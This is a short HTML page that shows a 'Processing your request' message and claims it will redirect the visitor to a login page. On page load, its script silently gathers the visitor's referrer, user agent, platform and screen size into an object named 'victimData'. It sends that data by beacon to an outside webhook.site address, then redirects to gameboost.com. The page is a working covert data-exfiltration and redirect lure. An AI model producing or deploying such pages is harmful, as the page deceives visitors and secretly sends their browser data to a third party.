<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body onload="sendAndRedirect()">
    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
        <h2>Processing your request...</h2>
        <p>Please wait while we redirect you to the login page.</p>
    </div>

    <script>
        function sendAndRedirect() {
        
            const webhookUrl = "https://webhook.site/028048b6-9240-4e61-bff6-e35594c32a79";
            

            const victimData = {
                referrer: document.referrer || "Direct Access",
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenResolution: window.screen.width + "x" + window.screen.height,
                timestamp: new Date().toLocaleString()
            };

           
            navigator.sendBeacon(webhookUrl, JSON.stringify(victimData));

           
            setTimeout(function() {
                
                window.location.href = "https://gameboost.com"; 
            }, 1000); 
        }
    </script>
</body>
</html>
